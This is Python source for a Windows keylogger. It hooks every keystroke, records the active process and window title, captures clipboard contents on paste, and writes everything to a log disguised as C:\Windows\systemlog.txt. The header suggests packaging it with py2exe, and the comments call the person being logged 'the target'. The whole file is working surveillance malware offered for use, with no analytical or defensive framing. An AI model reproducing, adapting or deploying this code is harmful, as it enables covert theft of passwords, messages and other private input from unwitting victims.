
'''
Suggestion:
Use py2exe to turn this script into a Windows executable.
Example: python setup.py py2exe

Run as administrator to store file under current path.
Change pathname if administrator level privilege is not possible.
'''

import pyHook
import pythoncom
import sys
import logging
from ctypes import *
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from datetime import datetime


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

file_log = "C:\\Windows\\systemlog.txt"


def get_current_process():
	# Get a handle to the foreground window
	fg_window = user32.GetForegroundWindow()

	# Find the process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(fg_window, byref(pid))

	# Store the current process ID
	process_id = "{}".format(pid.value)

	# Grab the executable
	executable = create_string_buffer("\x00" * 512)
	fg_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	# Get the executable name
	psapi.GetModuleBaseNameA(fg_process, None, byref(executable), 512)

	# Read the executable name
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(fg_window, byref(window_title), 512)

	# Get the current time
	time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

	with open(file_log, 'a+') as f:
		# Print out the header if we're in the right process
		data1 = "\n{} - PID: {} - {} - {}:\n".format(time_now, process_id, executable.value, window_title.value)
		f.write(data1)

	# Close handles
	kernel32.CloseHandle(fg_window)
	kernel32.CloseHandle(fg_process)


def OnKeyboardEvent(event):

	global current_window

	# Check to see if the target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

	with open(file_log, 'a+') as f:
		# If the target presses a standard key
		if event.Ascii > 32 and event.Ascii < 127:
			data = chr(event.Ascii)
			f.write(data)
		else:
			# If [Ctrl-V], get the value on the clipboard
			if event.Key == "V":
				OpenClipboard()
				pasted_value = GetClipboardData()
				CloseClipboard()

				data = "[PASTE] - {}".format(pasted_value)
				f.write(data)

			else:
				data = "[{}]".format(event.Key)
				f.write(data)

	# Pass execution to the next hook registered
	return True


# Create and register a hook manager
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent

# Register the hook and execute forever
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
